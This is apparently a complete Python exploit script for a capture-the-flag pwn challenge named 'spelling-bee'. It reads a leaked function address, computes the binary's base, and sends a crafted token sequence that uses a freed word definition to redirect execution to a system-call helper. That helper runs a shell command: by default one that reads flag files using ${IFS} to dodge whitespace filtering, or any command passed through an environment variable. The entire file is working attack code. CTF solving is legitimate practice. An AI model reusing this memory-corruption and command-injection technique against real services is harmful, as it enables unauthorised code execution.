#!/usr/bin/env python3
import os
import socket
import ssl
import struct
import subprocess
import sys
import time


CHALL_DIR = "/home/ks2n/ctf-events/b01ler-2026/pwn/spelling-bee/dist/spelling-bee"
BIN_PATH = f"{CHALL_DIR}/chall"
HOST = os.environ.get("HOST", "spelling-bee.opus4-7.b01le.rs")
PORT = int(os.environ.get("PORT", "8443"))
SSL_ENABLED = os.environ.get("SSL", "1") != "0"

DOSYS_OFF = 0x146B

BAD_TOKEN_BYTES = set(b" \t\n\r\v\f")


class LocalTube:
    def __init__(self, argv):
        self.p = subprocess.Popen(
            argv,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            bufsize=0,
        )

    def recvline(self):
        return self.p.stdout.readline()

    def send(self, data):
        self.p.stdin.write(data)
        self.p.stdin.flush()

    def recv_all(self, timeout=1.0):
        end = time.time() + timeout
        chunks = []
        while time.time() < end:
          remaining = max(0.05, end - time.time())
          r, _, _ = __import__("select").select([self.p.stdout], [], [], remaining)
          if not r:
              continue
          chunk = os.read(self.p.stdout.fileno(), 4096)
          if not chunk:
              break
          chunks.append(chunk)
        return b"".join(chunks)

    def close(self):
        try:
            self.p.kill()
        except ProcessLookupError:
            pass


class RemoteTube:
    def __init__(self, host, port, use_ssl=True):
        sock = socket.create_connection((host, port), timeout=10)
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        self.sock = sock
        self.f = sock.makefile("rwb", buffering=0)

    def recvline(self):
        return self.f.readline()

    def send(self, data):
        self.f.write(data)
        self.f.flush()

    def recv_all(self, timeout=1.5):
        self.sock.settimeout(timeout)
        chunks = []
        while True:
            try:
                chunk = self.sock.recv(4096)
            except TimeoutError:
                break
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks)

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass


def info(msg):
    print(f"[*] {msg}")


def parse_mode():
    argv = set(sys.argv[1:])
    remote = "REMOTE" in argv
    gdb = "GDB" in argv
    return remote, gdb


def start(remote, gdb):
    if remote:
        return RemoteTube(HOST, PORT, SSL_ENABLED)
    if gdb:
        # GDB mode: easiest non-pwntools path is to stop at startup under gdb.
        # Example: ./exploit.py GDB, then in another terminal attach/continue if desired.
        info("starting local process; attach GDB manually if desired")
    return LocalTube([BIN_PATH])


def read_banner(io):
    l1 = io.recvline()
    l2 = io.recvline()
    l3 = io.recvline()
    if not l3:
        raise RuntimeError("failed to read startup leak")
    leak = int(l3.strip(), 16)
    pie = leak - DOSYS_OFF
    return (l1 + l2 + l3), leak, pie


def build_payload(dosys_addr, command):
    low6 = struct.pack("<Q", dosys_addr)[:6]
    if any(b in BAD_TOKEN_BYTES for b in low6):
        raise ValueError(f"dosys low bytes are token-unsafe: {low6!r}")

    inner_name = b"G" * 30
    caller_name = b"F"
    cmd_name = command + b"A" * (127 - len(command))
    fake_name = b"J" * 24 + low6

    if len(cmd_name) != 127:
        raise ValueError("command token must fit into 127 bytes")

    seq = [
        b":", inner_name, b"1", b";",
        b":", caller_name, inner_name, b";",
        b"forget", inner_name,
        b":", cmd_name, b";",
        b":", fake_name, b";",
        caller_name,
    ]
    return b" ".join(seq) + b" "


def run_once(remote, gdb, command):
    io = start(remote, gdb)
    try:
        banner, leak, pie = read_banner(io)
        info(f"dosys leak: {hex(leak)}")
        info(f"pie base:   {hex(pie)}")
        payload = build_payload(leak, command)
        io.send(payload)
        out = io.recv_all(2.0 if remote else 0.5)
        return banner + out
    finally:
        io.close()


def main():
    remote, gdb = parse_mode()
    command = os.environ.get("CMD", "cat${IFS}flag*;cat${IFS}/flag*;#").encode()

    attempts = int(os.environ.get("ATTEMPTS", "15"))
    last = b""
    for i in range(1, attempts + 1):
        try:
            info(f"attempt {i}/{attempts}")
            last = run_once(remote, gdb, command)
            sys.stdout.buffer.write(last)
            if b"bctf{" in last or b"PWNED" in last:
                return 0
        except ValueError as e:
            info(str(e))
            continue
        except Exception as e:
            info(f"attempt failed: {e}")
            continue

    info("exploit did not hit proof condition within retry budget")
    if last:
        sys.stdout.buffer.write(last)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
